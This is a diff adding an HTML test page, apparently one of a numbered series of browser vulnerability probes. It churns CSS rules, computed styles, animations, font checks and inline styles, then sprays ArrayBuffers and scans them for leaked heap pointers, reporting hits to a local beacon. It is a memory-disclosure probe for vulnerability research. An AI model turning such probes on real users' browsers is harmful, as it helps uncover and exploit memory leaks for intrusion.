@@ -1,0 +1,341 @@
+<!--
+  p784: CSSStyleSheet / CSSRule / Web Animations / FontFaceSet residue
+
+  CSSStyleSheet.insertRule/deleteRule manipulates the C++ StyleSheet
+  rule list. Each CSSRule (CSSStyleRule, CSSMediaRule, CSSKeyframesRule)
+  is a C++ object with selector, property map, and parent references.
+  Bulk insert/delete exercises the rule allocator and invalidation.
+
+  CSSOM: getComputedStyle() creates a C++ CSSComputedStyleDeclaration
+  that lazily resolves style properties. Accessing many properties on
+  many elements exercises the style resolver cache.
+
+  Web Animations API: element.animate() creates C++ Animation objects
+  with KeyframeEffect, timing, and playback state. Each animation
+  allocates interpolation state, computed keyframes, and compositor
+  layer references. cancel() frees the animation state.
+
+  document.fonts (FontFaceSet) methods: check(), load(), ready all
+  interact with the C++ FontFaceSet which maintains internal queues
+  of loading/loaded faces. Rapid check() calls exercise the font
+  matching cache.
+
+  CSSStyleDeclaration (element.style) set/remove exercises the
+  inline style C++ backing, which maintains a property vector.
+
+  Attack angles:
+  A) CSSStyleSheet insertRule/deleteRule churn.
+  B) getComputedStyle property access flood.
+  C) Web Animations API animate/cancel churn.
+  D) FontFaceSet check/load cache residue.
+  E) Inline style (CSSStyleDeclaration) bulk set/remove.
+  F) CSSKeyframesRule/CSSMediaRule nested rule churn.
+
+  CRASH_CLASS: LOW (CSS/animation APIs, no side effects)
+  prior art: p773 (CSS style resolution), p775 (SVG pipeline)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p784</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+function sprayAndScan(tag,round,sizes){
+  var hits=0;
+  for(var si=0;si<sizes.length;si++){
+    var sz=sizes[si];
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(sz);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=sz;off+=8){
+        if(isPtr(dv,off)){
+          hits++;
+          if(hits<=2)b(tag+'-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+  }
+  return hits;
+}
+
+window.onload=function(){
+b('p784-START');
+
+// === Section A: CSSStyleSheet insertRule/deleteRule churn ===
+try{
+  b('A-stylesheet');
+  var aHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var style=document.createElement('style');
+      document.head.appendChild(style);
+      var sheet=style.sheet;
+
+      for(var i=0;i<100;i++){
+        try{
+          sheet.insertRule('.rule_'+round+'_'+i+' { color: rgb('+(i%256)+','+(round*40)+',100); font-size: '+(10+i%20)+'px; margin: '+i+'px; padding: '+(i*2)+'px; border: 1px solid blue; }',sheet.cssRules.length);
+        }catch(e){
+          if(i===0&&round===0)b('A insert_err='+e.message);
+        }
+      }
+
+      if(round===0)b('A inserted '+sheet.cssRules.length+' rules');
+
+      while(sheet.cssRules.length>0){
+        sheet.deleteRule(sheet.cssRules.length-1);
+      }
+
+      document.head.removeChild(style);
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    aHits+=sprayAndScan('A',round,[48,64,96,128]);
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: getComputedStyle property access flood ===
+try{
+  b('B-computed-style');
+  var bHits=0;
+
+  var props=['color','backgroundColor','fontSize','margin','padding',
+    'border','width','height','display','position','top','left',
+    'fontFamily','fontWeight','lineHeight','letterSpacing','textAlign',
+    'overflow','zIndex','opacity','transform','transition','boxShadow',
+    'borderRadius','textDecoration','verticalAlign','cursor','visibility',
+    'whiteSpace','wordBreak'];
+
+  for(var round=0;round<3;round++){
+    (function(){
+      var elements=[];
+      for(var i=0;i<30;i++){
+        var el=document.createElement('div');
+        el.style.cssText='color:red;font-size:'+(10+i)+'px;margin:'+i+'px;padding:'+(i*2)+'px;display:inline-block;width:'+(50+i*3)+'px;height:'+(20+i*2)+'px;';
+        document.body.appendChild(el);
+        elements.push(el);
+      }
+
+      var readCount=0;
+      for(var ei=0;ei<elements.length;ei++){
+        var cs=getComputedStyle(elements[ei]);
+        for(var pi=0;pi<props.length;pi++){
+          var val=cs.getPropertyValue(props[pi]);
+          readCount++;
+        }
+      }
+
+      if(round===0)b('B read '+readCount+' computed properties across '+elements.length+' elements');
+
+      for(var i=0;i<elements.length;i++){
+        document.body.removeChild(elements[i]);
+      }
+      elements=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    bHits+=sprayAndScan('B',round,[48,64,96,128]);
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: Web Animations API animate/cancel churn ===
+try{
+  b('C-web-animations');
+  var cHits=0;
+
+  var animSupported=false;
+  var testEl=document.createElement('div');
+  if(testEl.animate)animSupported=true;
+
+  if(!animSupported){
+    b('C-SKIP no element.animate');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var elements=[];
+        var animations=[];
+
+        for(var i=0;i<40;i++){
+          var el=document.createElement('div');
+          el.style.cssText='width:20px;height:20px;background:red;position:absolute;left:'+(i*5)+'px;top:0;';
+          document.body.appendChild(el);
+          elements.push(el);
+
+          try{
+            var anim=el.animate([
+              {transform:'translateX(0px)',opacity:1,backgroundColor:'red'},
+              {transform:'translateX('+(50+i*3)+'px)',opacity:0.5,backgroundColor:'blue'},
+              {transform:'translateX(0px)',opacity:1,backgroundColor:'green'}
+            ],{
+              duration:100+i*10,
+              iterations:2,
+              easing:'ease-in-out',
+              fill:'forwards'
+            });
+            animations.push(anim);
+          }catch(e){
+            if(i===0&&round===0)b('C anim_err='+e.message);
+          }
+        }
+
+        if(round===0)b('C created '+animations.length+' animations');
+
+        for(var i=0;i<animations.length;i++){
+          try{animations[i].cancel();}catch(e){}
+        }
+
+        for(var i=0;i<elements.length;i++){
+          document.body.removeChild(elements[i]);
+        }
+        animations=null;elements=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      cHits+=sprayAndScan('C',round,[48,64,96,128,192]);
+    }
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: FontFaceSet check/load cache residue ===
+try{
+  b('D-fontfaceset');
+  var dHits=0;
+  var fonts=document.fonts;
+
+  if(!fonts||!fonts.check){
+    b('D-SKIP no document.fonts.check');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var families=['serif','sans-serif','monospace','cursive','fantasy',
+          'Arial','Helvetica','Times','Courier','Georgia','Verdana',
+          'Tahoma','Impact','Comic Sans MS','Lucida Console'];
+        var sizes=['10px','12px','14px','16px','18px','20px','24px','32px','48px','72px'];
+
+        var checkCount=0;
+        for(var fi=0;fi<families.length;fi++){
+          for(var si=0;si<sizes.length;si++){
+            try{
+              var result=fonts.check(sizes[si]+' "'+families[fi]+'"');
+              checkCount++;
+            }catch(e){}
+          }
+        }
+
+        if(round===0)b('D font checks='+checkCount+' across '+families.length+' families x '+sizes.length+' sizes');
+
+        try{
+          fonts.load('16px serif');
+          fonts.load('16px sans-serif');
+          fonts.load('16px monospace');
+        }catch(e){}
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      dHits+=sprayAndScan('D',round,[32,48,64,96]);
+    }
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: Inline style bulk set/remove ===
+try{
+  b('E-inline-style');
+  var eHits=0;
+
+  var styleProps=['color','backgroundColor','fontSize','margin','padding',
+    'border','width','height','display','position','top','left','right','bottom',
+    'fontFamily','fontWeight','lineHeight','letterSpacing','textAlign',
+    'overflow','zIndex','opacity','transform','boxShadow','borderRadius',
+    'textDecoration','verticalAlign','cursor','visibility','whiteSpace'];
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var elements=[];
+      for(var i=0;i<50;i++){
+        var el=document.createElement('div');
+        document.body.appendChild(el);
+
+        for(var pi=0;pi<styleProps.length;pi++){
+          try{
+            el.style.setProperty(styleProps[pi],'initial');
+          }catch(e){}
+        }
+
+        for(var pi=0;pi<styleProps.length;pi++){
+          try{
+            el.style.removeProperty(styleProps[pi]);
+          }catch(e){}
+        }
+        elements.push(el);
+      }
+
+      if(round===0)b('E churned 50 elements x '+styleProps.length+' inline properties each');
+
+      for(var i=0;i<elements.length;i++){
+        document.body.removeChild(elements[i]);
+      }
+      elements=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    eHits+=sprayAndScan('E',round,[32,48,64,96]);
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: CSSKeyframesRule/CSSMediaRule nested rule churn ===
+try{
+  b('F-nested-rules');
+  var fHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var style=document.createElement('style');
+      document.head.appendChild(style);
+      var sheet=style.sheet;
+
+      for(var i=0;i<20;i++){
+        try{
+          sheet.insertRule('@keyframes anim_'+round+'_'+i+' { 0% { opacity: 0; transform: scale(0.5); } 50% { opacity: 1; transform: scale(1.2); } 100% { opacity: 0; transform: scale(1); } }',sheet.cssRules.length);
+        }catch(e){
+          if(i===0&&round===0)b('F keyframes_err='+e.message);
+        }
+      }
+
+      for(var i=0;i<20;i++){
+        try{
+          sheet.insertRule('@media (min-width: '+(100+i*50)+'px) { .media_'+round+'_'+i+' { color: rgb('+(i*12)+','+(round*40)+',200); font-size: '+(10+i)+'px; } }',sheet.cssRules.length);
+        }catch(e){}
+      }
+
+      if(round===0)b('F inserted '+sheet.cssRules.length+' rules (keyframes + media)');
+
+      while(sheet.cssRules.length>0){
+        sheet.deleteRule(0);
+      }
+
+      document.head.removeChild(style);
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    fHits+=sprayAndScan('F',round,[48,64,96,128]);
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p784-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
